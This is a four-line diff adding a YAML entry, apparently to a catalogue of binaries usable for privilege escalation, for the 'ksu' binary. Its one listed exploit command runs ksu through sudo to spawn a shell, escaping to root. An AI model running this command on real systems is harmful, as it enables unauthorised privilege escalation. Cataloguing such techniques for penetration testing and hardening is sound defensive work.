@@ -1,0 +1,4 @@
+name: ksu
+binary_path: /usr/bin/ksu
+exploit_cmds:
+- sudo /usr/bin/ksu -q -e /bin/sh
